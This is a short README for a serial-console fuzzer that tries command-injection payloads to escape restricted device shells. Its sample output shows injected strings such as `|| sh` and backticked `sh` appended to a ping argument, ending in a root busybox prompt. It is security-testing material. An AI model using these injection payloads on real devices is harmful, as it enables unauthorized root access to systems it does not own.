# CLISerialFuzzer
Serial Connection CLI Command Jail Break Fuzzer.

## Features
* Configurable Serial Communications
* Auto-relogin detection
* Success-case detection
* Exception-case detection
* Easy to configure command payloads
* Customizable timing / delays
* Fuzz resuming based on test case numbers
* Time remaining estimate updates

## Installation
```

```

## Command Line Parameters
```

```


## Output
```
Serial Connection CLI Command Jail Break Fuzzer : 1.0 Updated: May 3, 2018
Relogin String found from command (test case # 11): 
ping  127.0.0.1    `sh >> /dev/ttyp0`

Entering Username and Password...
Relogin String found from command (test case # 13): 
ping  127.0.0.1    sh

Entering Username and Password...
Relogin String found from command (test case # 35): 
ping  127.0.0.1    `sh >> /dev/ttyp0`

Entering Username and Password...
Error String found from command (test case # 36): 
ping  127.0.0.1    echo FREEDOM >> /tmp/imfree.txt

Success String found from command (test case # 42):
ping 127.0.0.1  || sh
Result Data:

root@busybox:~#

```
